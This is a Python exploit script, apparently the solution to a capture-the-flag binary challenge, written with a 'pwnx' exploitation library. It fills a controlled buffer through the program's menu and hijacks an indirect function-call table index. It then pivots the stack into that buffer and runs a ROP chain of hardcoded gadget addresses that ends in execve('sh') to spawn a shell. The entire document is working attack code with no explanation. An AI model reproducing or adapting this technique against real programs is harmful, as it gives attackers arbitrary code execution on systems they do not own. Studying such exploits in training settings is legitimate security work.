from pwnx import Challenge, bytes_, choice, field, integer, utf8
from pwnx.advanced import controlled_buffer, pivot, rop_palette


x = Challenge("./challenge")

store = x.protocol.menu(b"> ", name="store").define(
    message=choice(b"1", field(b"Message?", bytes_(max_size=0x1000), "data")),
    color=choice(b"2", field(b"> ", integer(delimiter=None), "index")),
    show=choice(b"3"),
)

message = controlled_buffer(
    x,
    "message",
    at=0x2F9E38,
    size=0x1000,
    writer=store.message,
    constraints=[utf8()],
)

call = x.control(
    x.indirect_call(
        table=0x2F08E8,
        index=store.color,
        target=message.qword(80),
        trigger=store.show,
        state={"eax": message.address},
    )
)

pivot_control = x.control(
    pivot(call, stack=message, pointer_register="eax", gadget=0x242D79)
)

rop = rop_palette(
    x,
    pop={"rdi": 0x243565, "rsi": 0x243431, "rcx": 0x247566},
    zero={"rax": 0x247431},
    move={("rdx", "rax"): 0x2B184E, ("rax", "rcx"): 0x2B4E73},
    syscall=0x2A6602,
    constraints=[utf8()],
)

x.want(x.execve("sh"), via=pivot_control, using=rop)
x.run()
